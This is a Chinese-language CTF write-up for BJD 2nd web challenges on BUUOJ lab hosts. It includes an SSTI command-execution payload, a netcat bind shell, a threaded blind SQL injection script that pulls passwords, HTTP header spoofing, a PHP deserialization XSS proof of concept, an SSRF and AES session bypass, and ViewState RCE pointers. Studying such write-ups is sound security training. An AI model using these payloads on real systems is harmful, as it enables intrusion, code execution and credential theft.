# BJD 2nd

## fakegoogle

ssti 直接搞 

```python
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```

## oldhack

tp5的一个RCE

## duangshell

一直想怎么反弹shell

后来被提醒了其实可以正向搞shell

正向弹

靶机：
```bash
nc -lvvp 2333 -e /bin/bash
```

攻击机
```
nc ip 2333
```

## 简单注入

sql在``hint.txt``里给出了

```sql
select * from users where username='$_POST["username"]' and password='$_POST["password"]';
```

拦截了``= ' " select ``

poc
```
username=\&password=or 1#
```

Exp:
```python
#coding=utf-8
# 过滤 = select '
import requests
import threading
import string
url="http://3ff31987-f21d-4232-b55e-098ceb490cf7.node3.buuoj.cn/"

#sql="select(group_concat(username))from(admin)" 
#sql="select(group_concat(password))from(admin)"
#sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')"
#sql="select(group_concat(content))from(contents)"
#sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"
#sql="database()"
#Result:p3rh4ps
#sql="select(group_concat(table_name))from(information_schema.tables)where(table_schema like 0x70337268347073)"
sql="password"
#Result:OhyOuFOuNit
#sql="username"
#Result:admin
#Result:id,username,password
#sql="select(group_concat(password))from(F1naI1y)"
#sql="select(group_concat(password))from(users)"

#sql="select(group_concat(username))from(admin)"
# Result:b210a7ad,503b791
#sql="select(group_concat(password))from(admin)"
# Result:cd27c5c0,c5bbaf1
#sql="select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')" Result:id,title,content,is_gnable
#sql="select load_file('/flag')"


ret=''
def booltest(start,end):
    ret=""
    for i in range(start,end):
        l=1
        r=255
        while(l+1<r):
            mid=(l+r)/2
            payload="or 0^((ascii(substr(({0}),{1},1)))>{2})^0#".format(sql,i,mid)
            #payload="or 0^((ascii(substr((version()),1,1)))>2)^0#"
            #payload="if((ascii(substr(({0}),{1},1)))>{2},1,0)".format(sql,i,mid)
            #payload="union select * from images where id=if((ascii(substr(({0}),{1},1)))>{2},1,0)#".format(sql,i,mid)
            #print payload
            #param = {
            #    "id":payload,
            #}
            data = {
                "username":"\\",
                "password":payload,
            }
            #print chr(mid)
            #print 
            req=requests.post(url,data=data)
            if (req.status_code != requests.codes.ok):
                continue
            #print req.text
            if ("stronger" in req.text):
                l=mid
            else :
                r=mid
        if chr(r) not in string.printable:
            break
        ret=ret+chr(r)
        print(threading.current_thread().name+"working:"+ret) 
    print(threading.current_thread().name+"Final:"+ret)
    


thr1 = threading.Thread(target=booltest, args=(1, 15),name="1")
thr2 = threading.Thread(target=booltest, args=(13, 20),name="2")
thr3 = threading.Thread(target=booltest, args=(21, 30),name="3")
thr4 = threading.Thread(target=booltest, args=(31, 40),name="4")

thr1.start()
thr2.start()
thr3.start()
thr4.start()
```

## 假猪套天下第一

302跳转会泄露``L0g1n.php``,``DS_Store``也有

Payload:
```
GET /L0g1n.php HTTP/1.1
Host: node3.buuoj.cn:26256
Cache-Control: max-age=10000000000000000
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Commodore 64
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: track_uuid=24fa757a-273e-49ed-bbc3-dd363e840ac9; PHPSESSID=7o5ms18nndg45n3339g419ioo0; time=900584929759
Client-IP: 127.0.0.1
Referer: gem-love.com
Date: Sat,29 Oct 2119 19:43:31 GMT
If-Modified-Since: Sat,29 Oct 2119 19:43:31 GMT
If-Unmodified-Since: Sat,29 Oct 2119 19:43:31 GMT
From: root@gem-love.com
Via: y1ng.vip
Connection: close
```

...一开始眼瞎没看到cookie里面的time,吧能加的时间头加了都没用...

## XSS之光

``.git``泄露拿到

```
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
```

利用php原生类反序列化搞xss

参考链接:
https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html

Poc
```
<?php
$a = new Exception("<script>alert(1)</script>");
$b = serialize($a);
echo urlencode($b);
```

## Schrödinger

html有个``test.php``
刚好可以爆破。。。
然后发现rate是前端算的。。。
cookie存了开始爆破的时间戳
然后就可以让他等于100%
拿到password


## elementmaster

html 里有奇怪的东西

```
<p hidden id="506F2E">I am the real Element Masterrr!!!!!!</p>
<p hidden id="706870">@颖奇L'Amore</p>
```

跑这个
```python
#coding=utf-8
import requests
periodic_table = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar',
                  'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 
                  'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 
                  'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 
                  'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 
                  'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr',
                  'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue')
url="http://88105434-0b87-4a2b-8b5d-e18efd01faa5.node3.buuoj.cn/"

for element in periodic_table:
    req=requests.get(url+element+".php")
    if(req.status_code!=requests.codes.ok):
        continue
    print req.text
```

## 文件探测

header里有hint``home.php``

看这个url就想到LFI

拿到system.php

```php
<?php
error_reporting(0);
if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){
    echo "<script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');</script>";
    header("Refresh:0.1;url=index.php");
    die;
}

$str2 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;url invalid<br>~$ ';
$str3 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;damn hacker!<br>~$ ';
$str4 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;request method error<br>~$ ';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Detector</title>

    <link rel="stylesheet" type="text/css" href="css/normalize.css" />
    <link rel="stylesheet" type="text/css" href="css/demo.css" />

    <link rel="stylesheet" type="text/css" href="css/component.css" />

    <script src="js/modernizr.custom.js"></script>

</head>
<body>
<section>
    <form id="theForm" class="simform" autocomplete="off" action="system.php" method="post">
        <div class="simform-inner">
            <span><p><center>File Detector</center></p></span>
            <ol class="questions">
                <li>
                    <span><label for="q1">你知道目录下都有什么文件吗?</label></span>
                    <input id="q1" name="q1" type="text"/>
                </li>
                <li>
                    <span><label for="q2">请输入你想检测文件内容长度的url</label></span>
                    <input id="q2" name="q2" type="text"/>
                </li>
                <li>
                    <span><label for="q1">你希望以何种方式访问？GET？POST?</label></span>
                    <input id="q3" name="q3" type="text"/>
                </li>
            </ol>
            <button class="submit" type="submit" value="submit">提交</button>
            <div class="controls">
                <button class="next"></button>
                <div class="progress"></div>
                <span class="number">
					<span class="number-current"></span>
					<span class="number-total"></span>
				</span>
                <span class="error-message"></span>
            </div>
        </div>
        <span class="final-message"></span>
    </form>
    <span><p><center><a href="https://gem-love.com" target="_blank">@颖奇L'Amore</a></center></p></span>
</section>

<script type="text/javascript" src="js/classie.js"></script>
<script type="text/javascript" src="js/stepsForm.js"></script>
<script type="text/javascript">
    var theForm = document.getElementById( 'theForm' );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( '.simform-inner' ), 'hide' );
            var messageEl = theForm.querySelector( '.final-message' );
            form.submit();
            messageEl.innerHTML = 'Ok...Let me have a check';
            classie.addClass( messageEl, 'show' );
        }
    } );
</script>

</body>
</html>
<?php

$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';


if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {
    $url = $_POST['q2'].".y1ng.txt";
    $method = $_POST['q3'];

    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei<br>";

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf("$url method&content_size:$method%d", $detect));
}

?>
```

顺便扫了一下网站目录

有``robots.txt``

还有``flag.php admin.php``

然而能拿到的只有``system.php``

根据源码逻辑
可以ssrf拿到admin.php

```
p2=http://127.0.0.1:2333/admin.php
p3=GET %s
```

```php
<?php
error_reporting(0);
session_start();
$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake

function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE['your_ip_address']) && $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) && $_COOKIE['y1ng'] === sha1(md5('y1ng')))
        return true;
    else
        return false;
}

if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} else {
    echo "<head><title>403 Forbidden</title></head><body bgcolor=black><center><font size='10px' color=white><br>only 127.0.0.1 can access! You know what I mean right?<br>your ip address is " . $_SERVER['REMOTE_ADDR'];
}


$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);

if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die('爬');
        }
    } else{
        header("Refresh:0.1;url=index.php");
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
}


?>
```

控制Session为空绕过
```
<?php
function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5("174.0.222.75",true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

echo aesEn('', 'y1ng')."\n";
```

注意URLENCODE

## EasyAspDotNet

并不会ASP...

看师傅的WP了解了一下

HITCON CTF 2018 - Why so Serials

https://xz.aliyun.com/t/3019

关键是利用Viewstate

也就是这一坨

```html
<div class="aspNetHidden">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKLTQwNjA1MDA3OA9kFgICAw9kFgQCAQ8PFgIeCEltYWdlVXJsBRgvSW1nTG9hZC5hc3B4P3BhdGg9MS5wbmdkZAIDDw8WAh4EVGV4dAUOWW91IGNsaWNrZWQgbWVkZGR4zY/S3c+s3XBuPzurcjvMPynJ7A==" />
</div>
```

https://www.runoob.com/aspnet/aspnet-viewstate.html


解码网站

http://viewstatedecoder.azurewebsites.net/

解出来是这一坨

```php
Format marker: FF
Version marker: 01
Pair
    Pair
    "-406050078"
    Pair
        null
        ArrayList of 2 element(s):
            3
            Pair
                null
                ArrayList of 4 element(s):
                    1
                    Pair
                        Pair
                            ArrayList of 2 element(s):
                                "ImageUrl"
                                "/ImgLoad.aspx?path=1.png"
                            null
                        null
                    3
                    Pair
                        Pair
                            ArrayList of 2 element(s):
                                "Text"
                                "You clicked me"
                            null
                        null
    null
20 byte(s) left over, perhaps an HMACSHA1 signature?
```

然后我们想可以不可以篡改这里面的内容让他变成我们想要的东西呢

可以看到最后是有HMACSHA1对其完整性进行校验的

可以利用ysoserial https://github.com/pwntester/ysoserial.net 来伪造

按照这个教程

https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/

拿到``web.config``里的``validationkey``就可以生成rce payload了

怎么拿``web.config``?

利用``/ImgLoad.aspx?path=2.png``LFI
